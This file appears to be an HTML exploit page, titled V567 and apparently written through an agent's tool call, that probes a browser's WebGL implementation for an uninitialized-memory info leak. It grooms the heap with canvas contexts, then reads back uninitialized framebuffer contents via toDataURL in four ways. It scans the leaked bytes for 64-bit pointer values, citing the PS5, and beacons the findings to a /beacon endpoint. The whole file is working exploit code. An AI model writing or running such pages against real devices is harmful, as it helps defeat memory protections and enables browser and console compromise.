@@ -1,0 +1,280 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><title>V567</title></head>
+<body style="background:#111;color:#0f0;font:13px monospace;padding:10px">
+<pre id="log"></pre>
+<script>
+var L=document.getElementById('log');
+function log(m){L.textContent+=m+'\n'}
+function beacon(tag,data){
+  log('[B] '+tag+': '+data);
+  try{
+    var x=new XMLHttpRequest();
+    x.open('GET','/beacon/V567-'+tag+'?d='+encodeURIComponent(String(data).substring(0,400))+'&t='+Date.now(),false);
+    x.send();
+  }catch(e){}
+}
+
+window.onerror=function(m,s,l,c){beacon('ONERROR',m+'|'+s+':'+l+':'+c)};
+beacon('BOOT','V567-webgl-infoleak');
+
+// =============================================
+// PHASE 0: Check WebGL availability
+// =============================================
+var c=document.createElement('canvas');
+c.width=64;c.height=64;
+var gl=c.getContext('webgl')||c.getContext('experimental-webgl');
+if(!gl){
+  beacon('FAIL','webgl-unavailable');
+  // Try webgl2
+  gl=c.getContext('webgl2');
+  if(!gl){
+    beacon('FAIL','webgl2-also-unavailable');
+    throw new Error('NO WEBGL');
+  }
+  beacon('WEBGL2','available');
+}else{
+  beacon('WEBGL','available|renderer='+gl.getParameter(gl.RENDERER)+'|vendor='+gl.getParameter(gl.VENDOR));
+}
+
+// =============================================
+// T1: Heap warmup — allocate and free many buffers to populate the heap
+// with interesting data (pointers from Canvas2D contexts, gradients, etc.)
+// =============================================
+(function(){
+  try{
+    // Create Canvas2D contexts (768B each with vtables, pointers)
+    var ctxs=[];
+    for(var i=0;i<100;i++){
+      var tc=document.createElement('canvas');tc.width=1;tc.height=1;
+      var tctx=tc.getContext('2d');
+      // Create gradient to put a CanvasGradient* pointer in the State
+      var g=tctx.createLinearGradient(0,0,1,1);
+      g.addColorStop(0,'red');g.addColorStop(1,'blue');
+      tctx.fillStyle=g;
+      // Set font to trigger FontCascade allocation
+      tctx.font='20px serif';
+      ctxs.push(tctx);
+    }
+    beacon('T1A','contexts='+ctxs.length);
+
+    // Free half of them to put pointer-rich data back in the freelist
+    for(var i=0;i<50;i++) ctxs[i]=null;
+    ctxs.splice(0,50);
+
+    // Force GC to return memory
+    for(var g=0;g<10;g++){var j=[];for(var k=0;k<5000;k++)j.push({x:k});j=null;}
+    beacon('T1B','freed-50-contexts');
+  }catch(e){beacon('T1','ERR:'+e.message)}
+})();
+
+// =============================================
+// T2: WebGL incomplete FBO + toDataURL — primary info leak
+// The readPixelsForPaintResults path allocates UNINITIALIZED heap buffer
+// If GL_ReadnPixelsRobustANGLE fails, raw heap data is in the pixel buffer
+// =============================================
+function scanPixels(data,tag){
+  var nz=0,first=-1,ptrLike=0,samples=[];
+  for(var i=0;i<data.length;i++){
+    if(data[i]!==0){
+      nz++;
+      if(first<0)first=i;
+    }
+  }
+  // Scan for pointer-like 8-byte sequences (0x00007f or 0x000000xx patterns)
+  // PS5 is 64-bit, pointers typically in 0x0000008xxxxxxxxx range
+  var dv=new DataView(data.buffer,data.byteOffset,data.byteLength);
+  for(var i=0;i+7<data.length;i+=8){
+    var hi=dv.getUint32(i+4,true);
+    var lo=dv.getUint32(i,true);
+    // Check for typical 64-bit pointer patterns
+    if((hi>>>16)===0x0000 && hi>0 && lo>0){
+      ptrLike++;
+      if(samples.length<5){
+        var hex=('00000000'+hi.toString(16)).slice(-8)+('00000000'+lo.toString(16)).slice(-8);
+        samples.push('o'+i+'=0x'+hex);
+      }
+    }
+  }
+  beacon(tag,'nz='+nz+'|first='+first+'|ptrLike='+ptrLike+'|s='+samples.join(','));
+  return {nz:nz,ptrLike:ptrLike,samples:samples};
+}
+
+// Approach 1: Incomplete FBO (no color attachment)
+(function(){
+  try{
+    var wc=document.createElement('canvas');wc.width=128;wc.height=128;
+    var wgl=wc.getContext('webgl');
+    if(!wgl){beacon('T2','no-webgl');return;}
+
+    // Create incomplete FBO
+    var fbo=wgl.createFramebuffer();
+    wgl.bindFramebuffer(wgl.FRAMEBUFFER,fbo);
+    // Don't attach anything — framebuffer incomplete
+
+    var status=wgl.checkFramebufferStatus(wgl.FRAMEBUFFER);
+    beacon('T2A','fbo-status=0x'+status.toString(16));
+
+    // Draw something to default FBO first (puts data in GPU memory)
+    wgl.bindFramebuffer(wgl.FRAMEBUFFER,null);
+    wgl.clearColor(0.1,0.2,0.3,1.0);
+    wgl.clear(wgl.COLOR_BUFFER_BIT);
+
+    // Switch to incomplete FBO
+    wgl.bindFramebuffer(wgl.FRAMEBUFFER,fbo);
+
+    // Try to render (will fail silently on incomplete FBO)
+    wgl.clearColor(1,0,0,1);
+    wgl.clear(wgl.COLOR_BUFFER_BIT);
+    var err=wgl.getError();
+    beacon('T2B','after-clear-on-incomplete|err=0x'+err.toString(16));
+
+    // Switch back to default and toDataURL
+    wgl.bindFramebuffer(wgl.FRAMEBUFFER,null);
+
+    // The critical call — toDataURL triggers readPixelsForPaintResults
+    var dataUrl=wc.toDataURL('image/png');
+    beacon('T2C','dataURL-len='+dataUrl.length);
+
+    // Decode the toDataURL result through a 2D canvas
+    var img=new Image();
+    img.onload=function(){
+      var dc=document.createElement('canvas');dc.width=128;dc.height=128;
+      var dctx=dc.getContext('2d');
+      dctx.drawImage(img,0,0);
+      var px=dctx.getImageData(0,0,128,128);
+      scanPixels(px.data,'T2D');
+
+      // Continue with approach 2 after this completes
+      approach2();
+    };
+    img.onerror=function(){
+      beacon('T2D','img-decode-err');
+      approach2();
+    };
+    img.src=dataUrl;
+
+    wgl.deleteFramebuffer(fbo);
+  }catch(e){
+    beacon('T2','ERR:'+e.message);
+    approach2();
+  }
+})();
+
+// Approach 2: Texture with no storage as FBO attachment
+function approach2(){
+  try{
+    var wc2=document.createElement('canvas');wc2.width=64;wc2.height=64;
+    var gl2=wc2.getContext('webgl');
+    if(!gl2){beacon('T3','no-webgl');approach3();return;}
+
+    var tex=gl2.createTexture();
+    gl2.bindTexture(gl2.TEXTURE_2D,tex);
+    // DON'T call texImage2D — no storage allocated
+
+    var fbo2=gl2.createFramebuffer();
+    gl2.bindFramebuffer(gl2.FRAMEBUFFER,fbo2);
+    gl2.framebufferTexture2D(gl2.FRAMEBUFFER,gl2.COLOR_ATTACHMENT0,gl2.TEXTURE_2D,tex,0);
+
+    var status=gl2.checkFramebufferStatus(gl2.FRAMEBUFFER);
+    beacon('T3A','tex-fbo-status=0x'+status.toString(16));
+
+    // Back to default FBO for toDataURL
+    gl2.bindFramebuffer(gl2.FRAMEBUFFER,null);
+    // Don't clear — leave whatever was there
+
+    var dataUrl2=wc2.toDataURL('image/png');
+    beacon('T3B','dataURL-len='+dataUrl2.length);
+
+    var img2=new Image();
+    img2.onload=function(){
+      var dc2=document.createElement('canvas');dc2.width=64;dc2.height=64;
+      var dctx2=dc2.getContext('2d');
+      dctx2.drawImage(img2,0,0);
+      var px2=dctx2.getImageData(0,0,64,64);
+      scanPixels(px2.data,'T3C');
+      approach3();
+    };
+    img2.onerror=function(){beacon('T3C','decode-err');approach3();};
+    img2.src=dataUrl2;
+
+    gl2.deleteFramebuffer(fbo2);
+    gl2.deleteTexture(tex);
+  }catch(e){beacon('T3','ERR:'+e.message);approach3();}
+}
+
+// Approach 3: WEBGL_lose_context then toDataURL
+function approach3(){
+  try{
+    var wc3=document.createElement('canvas');wc3.width=64;wc3.height=64;
+    var gl3=wc3.getContext('webgl');
+    if(!gl3){beacon('T4','no-webgl');approach4();return;}
+
+    // Draw something first
+    gl3.clearColor(0.5,0.6,0.7,1.0);
+    gl3.clear(gl3.COLOR_BUFFER_BIT);
+
+    var loseExt=gl3.getExtension('WEBGL_lose_context');
+    if(!loseExt){beacon('T4A','no-lose-context-ext');approach4();return;}
+
+    // Lose the context
+    loseExt.loseContext();
+    beacon('T4A','context-lost|isLost='+gl3.isContextLost());
+
+    // toDataURL on lost context — readPixelsForPaintResults should fail
+    var dataUrl3=wc3.toDataURL('image/png');
+    beacon('T4B','dataURL-len='+dataUrl3.length);
+
+    var img3=new Image();
+    img3.onload=function(){
+      var dc3=document.createElement('canvas');dc3.width=64;dc3.height=64;
+      var dctx3=dc3.getContext('2d');
+      dctx3.drawImage(img3,0,0);
+      var px3=dctx3.getImageData(0,0,64,64);
+      scanPixels(px3.data,'T4C');
+      approach4();
+    };
+    img3.onerror=function(){beacon('T4C','decode-err');approach4();};
+    img3.src=dataUrl3;
+  }catch(e){beacon('T4','ERR:'+e.message);approach4();}
+}
+
+// Approach 4: Multiple canvases of different sizes to probe different heap size classes
+function approach4(){
+  try{
+    var sizes=[32,64,128,256];
+    var done=0;
+    for(var s=0;s<sizes.length;s++){
+      (function(sz,idx){
+        var wc=document.createElement('canvas');wc.width=sz;wc.height=sz;
+        var wgl=wc.getContext('webgl');
+        if(!wgl){beacon('T5-'+idx,'no-webgl|sz='+sz);check();return;}
+
+        // Don't draw anything — default FBO is uninitialized
+        var dataUrl=wc.toDataURL('image/png');
+        var img=new Image();
+        img.onload=function(){
+          var dc=document.createElement('canvas');dc.width=sz;dc.height=sz;
+          var dctx=dc.getContext('2d');
+          dctx.drawImage(img,0,0);
+          var px=dctx.getImageData(0,0,sz,sz);
+          scanPixels(px.data,'T5-'+idx+'-'+sz);
+          check();
+        };
+        img.onerror=function(){beacon('T5-'+idx,'decode-err');check();};
+        img.src=dataUrl;
+      })(sizes[s],s);
+    }
+    function check(){
+      done++;
+      if(done>=sizes.length) finish();
+    }
+  }catch(e){beacon('T5','ERR:'+e.message);finish();}
+}
+
+function finish(){
+  beacon('DONE','V567-complete');
+}
+</script>
+</body></html>
+</content>
+</invoke>
